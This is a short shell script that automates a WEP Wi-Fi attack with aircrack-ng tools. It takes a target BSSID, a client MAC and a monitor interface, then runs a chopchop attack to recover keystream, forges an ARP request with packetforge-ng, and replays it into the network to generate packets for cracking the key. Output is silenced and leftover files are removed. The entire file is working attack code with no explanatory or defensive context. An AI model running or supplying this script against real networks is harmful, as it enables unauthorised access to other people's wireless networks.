# $1 -> bssid
# $2 -> mac station
# $3 -> monitor interface

cd ../data
rm arp-request >/dev/null 2>/dev/null
rm *.xor >/dev/null 2>/dev/null
rm replay_*.cap >/dev/null 2>/dev/null
echo y | aireplay-ng -4 -b $1 -h $2 $3 >chopchop_1.log 2>/dev/null
packetforge-ng -0 -a $1 -h $2 -k 255.255.255.255 -l 255.255.255.255 -y $(ls *.xor) -w arp-request $3 >/dev/null 2>/dev/null
rm chopchop_1.log >/dev/null 2>/dev/null 
rm *.xor >/dev/null 2>/dev/null
rm replay_*.cap >/dev/null 2>/dev/null
echo y | aireplay-ng -2 -r arp-request $3 >chopchop_2.log 2>/dev/null
